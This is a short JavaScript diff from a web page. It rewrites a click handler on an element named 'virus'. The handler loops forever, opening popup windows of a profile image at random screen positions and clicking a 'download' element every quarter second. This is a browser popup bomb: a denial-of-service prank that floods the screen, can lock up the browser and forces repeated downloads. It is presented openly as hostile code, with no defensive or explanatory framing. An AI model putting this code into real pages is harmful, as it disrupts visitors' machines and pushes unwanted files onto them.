@@ -27,7 +27,11 @@ window.onload = function(){
 
 document.getElementById("virus").onclick = function(){
     while(true){
-        window.open("https://pbs.twimg.com/profile_images/461017900099203072/9iZtDGpm_400x400.jpeg",Math.random(),"width=a,height=a");
+        var mywindow = window.open("https://pbs.twimg.com/profile_images/461017900099203072/9iZtDGpm_400x400.jpeg",Math.random(),"width=300,height=300");
+        x = Math.floor(Math.random() * screen.availWidth) + 1
+        y = Math.floor(Math.random() * screen.availHeight) + 1
+        console.log(x,y)
+        mywindow.moveTo(x,y)
         document.getElementById("download").click();
         sleep(250);
     }
